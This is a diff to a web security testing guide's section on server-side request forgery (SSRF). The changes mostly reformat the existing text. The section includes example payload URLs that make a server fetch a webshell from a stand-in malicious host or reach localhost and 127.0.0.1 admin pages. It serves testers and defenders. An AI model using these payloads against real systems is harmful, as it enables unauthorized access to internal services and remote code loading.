@@ -12,20 +12,27 @@ Often web applications may have to interact with internal or external resources 
 
 ## How to Test
 
-When testing for SSRF we are trying to trick the server into loading/writing unintended content. The most common test is for local and remote file inclusion, but there is another facet to SSRF, a trust relationship that often arises with server-side request forgery where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls.
+When testing for SSRF we are trying to trick the server into loading/writing unintended content. The most common test is for local and remote file inclusion, but there is another facet to SSRF, a trust relationship that often arises with server-side request forgery where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. However internal systems often contain sensitive data or functionality.
 
-Such internal systems often contain sensitive data or functionality.
+If we have the following request:
 
-If we have the following request: `https://example.com/page?page=about.php`, we can try the following payloads.
+`https://example.com/page?page=about.php`,
+
+we can try the following payloads:
 
 Return the content of an external resource like a webshell.
+
 `https://example.com/page?page=https://malicioussite.com/shell.php`
 
 Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
 
 These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.
 
-`https://example.com/page?page=http://localhost/admin` or `https://example.com/page?page=http://127.0.0.1/admin`
+`https://example.com/page?page=http://localhost/admin`
+
+or
+
+`https://example.com/page?page=http://127.0.0.1/admin`
 
 Fetch a local file
 
